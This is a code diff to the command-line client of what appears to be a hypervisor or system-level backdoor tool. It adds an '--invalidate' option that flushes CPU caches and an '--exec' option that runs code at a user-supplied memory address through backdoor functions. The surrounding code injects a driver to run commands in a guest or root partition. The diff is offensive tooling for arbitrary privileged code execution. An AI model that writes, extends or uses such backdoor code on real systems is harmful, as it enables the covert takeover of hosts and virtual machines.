@@ -3252,6 +3252,59 @@ int _tmain(int argc, _TCHAR* argv[])
             // inject driver and execute command in the guest or root partition
             backdoor_vm_exec(pml4_addr, command);
         }
+        else if (!strcmp(command, "--invalidate"))
+        {
+            // invalidate CPU caches
+            if (backdoor_invalidate_caches() != 0)
+            {
+                return -1;
+            }
+
+            printf("[+] CPU caches has beed invalidated\n");
+        }
+        else if (!strcmp(command, "--exec") && argc >= 4)
+        {
+            uint64_t arg0 = 0, arg1 = 0, retval = 0;
+            uint64_t addr = strtoull(argv[3], NULL, 16);
+
+            if (errno == EINVAL)
+            {
+                printf("ERROR: Invalid function address\n");
+                return -1;
+            }
+
+            if (argc >= 5)
+            {
+                arg0 = strtoull(argv[4], NULL, 16);
+
+                if (errno == EINVAL)
+                {
+                    printf("ERROR: Invalid function argument\n");
+                    return -1;
+                }
+            }
+
+            if (argc >= 6)
+            {
+                arg1 = strtoull(argv[5], NULL, 16);
+
+                if (errno == EINVAL)
+                {
+                    printf("ERROR: Invalid function argument\n");
+                    return -1;
+                }
+            }
+
+            printf("[+] Executing function at 0x%llx\n", addr);
+
+            // execute code at given address
+            if (backdoor_execute(addr, arg0, arg1, &retval) != 0)
+            {
+                return -1;
+            }
+
+            printf("[+] Return value is 0x%llx\n", retval);
+        }
         else
         {
             printf("ERROR: Invalid command\n");
